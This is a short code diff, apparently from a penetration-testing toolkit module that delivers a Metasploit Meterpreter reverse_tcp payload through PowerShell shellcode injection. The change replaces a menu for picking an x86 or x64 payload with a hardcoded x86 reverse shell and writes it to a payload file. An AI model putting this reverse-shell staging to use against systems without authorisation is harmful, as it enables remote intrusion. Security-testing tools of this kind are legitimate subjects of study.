@@ -9,17 +9,8 @@ The powershell - shellcode injection leverages powershell to send a meterpreter 
 This technique was introduced by Matthew Graeber (http://www.exploit-monday.com/2011/10/exploiting-powershells-features-not.html)
 """
 
-payload = raw_input("Select payload you want to delivery via the powershell - shellcode injection\n\n1. Metasploit Meterpreter (x86)\n2. Metasploit Meterpreter (x64)\n\nEnter your choice: ")
-
-if payload == "": payload = "2"
-
-if payload == "1":
-    path = setdir + "/x86.powershell"
-    payload = "windows/meterpreter/reverse_tcp"
-if payload == "2":
-    path = setdir + "/x64.powershell"
-    payload = "windows/x64/meterpreter/reverse_tcp"
-
+# define standard metasploit payload
+payload = "windows/meterpreter/reverse_tcp"
 
 # create base metasploit payload to pass to powershell.prep
 filewrite = file(setdir + "/metasploit.payload", "w")
